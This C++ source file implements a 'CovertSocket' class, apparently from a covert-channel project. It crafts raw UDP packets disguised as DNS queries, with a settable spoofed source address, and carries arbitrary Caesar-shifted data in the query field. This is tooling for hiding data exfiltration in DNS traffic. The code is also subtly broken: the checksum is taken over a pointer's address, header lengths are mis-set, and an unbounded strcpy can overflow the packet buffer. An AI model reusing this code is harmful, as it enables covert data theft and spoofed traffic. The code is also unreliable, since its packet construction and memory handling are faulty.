//
// Created by bensoer on 18/10/16.
//

#include <dnet.h>
#include <cstring>
#include "CovertSocket.h"
#include "../utils/Structures.h"
#include "../utils/Logger.h"

#include <sys/types.h>
#include <unistd.h>

#include <netinet/ip.h>    	// IP Header definitions
#include <netinet/udp.h>
#include <iostream>

/**
 * instance holds instance for the covert socket singleton
 */
CovertSocket * CovertSocket::instance = nullptr;

/**
 * static method that generates an instance of a CovertSocket. this is enforced as a singleton
 * @return CovertSocket - a new covert socket instance if one doesn't already exist or the same one otherwise
 */
CovertSocket * CovertSocket::getInstance() {
    if(CovertSocket::instance == nullptr){
        CovertSocket::instance = new CovertSocket();
    }

    return CovertSocket::instance;
}

/**
 * setDestinationAddress is a configuration route that sets the destination address for the covert socket
 * @param destinationAddress String - the destination IP address being set
 */
void CovertSocket::setDestinationAddress(string destinationAddress) {
    this->destinationAddress = destinationAddress;
}

/**
 * setSourceAddress is a configuration route that sets the source address for the covert socket
 * @param sourceAddress String - the source IP address being set
 */
void CovertSocket::setSourceAddress(string sourceAddress) {
    this->sourceAddress = sourceAddress;
}

/**
 * the constructor for the CovertSocket. When a new instance is made by the singleton. This constructor is called and
 * initializes required components of the object. The constructor is set to private visibility so that no extra
 * instances are created
 * @return
 */
CovertSocket::CovertSocket() {

    //constructor
    this->rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
    int arg = 1;
    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
        perror("setsockopt");
    }

    //IP_HDRINCL to stop the kernel from building the packet headers
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
            perror("setsockopt");
    }


}

/**
 * send sends the passed in data out using the configurged desitnation and source addresses.The CovertSocket generates
 * a DNS packet and then fills it with the data needing to be sent. This method does not completely follow DNS as there
 * is a max count of 63 bytes. This method will simply append the data regardless of its length
 * @param data String - the data being sent
 */
void CovertSocket::send(string data) {

    Logger::debug("Data To Be Sent Is: >" + data + "<");
    Logger::debug("Data Length: >" + to_string(data.length()) + "<");
    Logger::debug("Data Size: >" + to_string(data.size()) + "<");

    char datagram[PKT_SIZE];
    struct iphdr *ip = (struct iphdr *) datagram;
    struct udphdr *udp = (struct udphdr *) (datagram + sizeof(*ip));
    struct DNS_HEADER *dns = (struct DNS_HEADER *) (datagram + sizeof(*ip) + sizeof(*udp));
    char *query = (char *)(datagram + sizeof(*ip) + sizeof(*udp) + sizeof(*dns));
    //struct QUESTION *dnsq = (struct QUESTION *)(datagram + sizeof(*ip) + sizeof(*udp) + sizeof(*dns));

    struct sockaddr_in sin;
    pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(this->destinationAddress.c_str());

    memset(datagram, 0, PKT_SIZE);

    //IP Header Fields
    ip->ihl = 5;        // IP Header Length
    ip->version = 4;        // Version 4
    ip->tos = 0;
    ip->tot_len = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(*dns) + data.size() + sizeof(struct QUESTION);    // Calculate the total Datagram size
    ip->id = htonl(12345);    //IP Identification Field
    ip->frag_off = 0;
    ip->ttl = 255;        // Set the TTL value
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;        //Initialize to zero before calculating checksum
    ip->saddr = inet_addr (this->sourceAddress.c_str());  //Source IP address
    ip->daddr = sin.sin_addr.s_addr;

    ip->check = this->csum((unsigned short *) datagram, ip->tot_len >> 1);

    //UDP Header Fields
    udp->dest = htons(53);
    //udp->source
    udp->source = htons(4378);

    Logger::debug("UDP Size: " + to_string(sizeof(*udp) + data.size()));
    Logger::debug("UDP Header: " + to_string(sizeof(*udp)));
    Logger::debug("UDP Payload: " + to_string(data.size()));

    //udp->len = htons(sizeof(*udp) + data.size());
    //udp->uh_sum = htons(sizeof(*udp) + data.size());
    udp->uh_sum = htons(sizeof(*udp) + sizeof(*dns) + data.size() + sizeof(struct QUESTION));
    udp->len = htons(sizeof(*udp) + sizeof(*dns) + data.size() + sizeof(struct QUESTION));
    udp->check = 0;

    //Pseudo Header
    psh.dest_address = sin.sin_addr.s_addr;
    psh.source_address = inet_addr(this->sourceAddress.c_str());
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;

    memcpy(&psh.udp, udp, sizeof(struct udphdr));
    udp->check = csum((unsigned short *) &udp, sizeof(pseudo_header));

    //memcpy(payload, data.c_str(), data.size());
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;

    if(CovertSocket::instance->caesarOffset != -1){
        string encryptedPayload = "";
        Logger::debug("Payload Requires Encryption. Encrypting");

        for(unsigned int i = 0; i < data.length(); i++){
            char c = data[i];
            encryptedPayload += (c + (CovertSocket::instance->caesarOffset));
        }

        data = encryptedPayload;
    }

    Logger::debug("Encrypted Payload Is: >" + data + "<");

    strcpy(query, data.c_str());
    //ChangetoDnsNameFormat(query, writable);

    struct QUESTION *dnsq = (struct QUESTION *)(datagram + sizeof(*ip) + sizeof(*udp) + sizeof(*dns) + data.size());

    dnsq->qtype = htons(1); // 1 for IPv4 lookup
    dnsq->qclass = htons(1); //1 for internet class

    //Send the packet
    if (sendto (this->rawSocket, datagram, ip->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
        perror ("sendto");
    }

}

/**
 * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
 * by the network stack
 * @param ptr
 * @param nbytes
 * @return
 */
unsigned short CovertSocket::csum (unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

/**
 * ChangetoDnsNameFormat is a helper method that changes the passed in dns name into the appropriate format. Due to our
 * data not being valid DNS data. This method is not used but is available in the event of further improvements
 * @param dns
 * @param host
 */
void CovertSocket::ChangetoDnsNameFormat(char* dns, char* host)
{
    int lock = 0 , i;
    strcat((char*)host,".");

    for(i = 0 ; i < strlen((char*)host) ; i++)
    {
        if(host[i]=='.')
        {
            *dns++ = i-lock;
            for(;lock<i;lock++)
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}

void CovertSocket::setCaesarOffset(int offset) {
    this->caesarOffset = offset;
}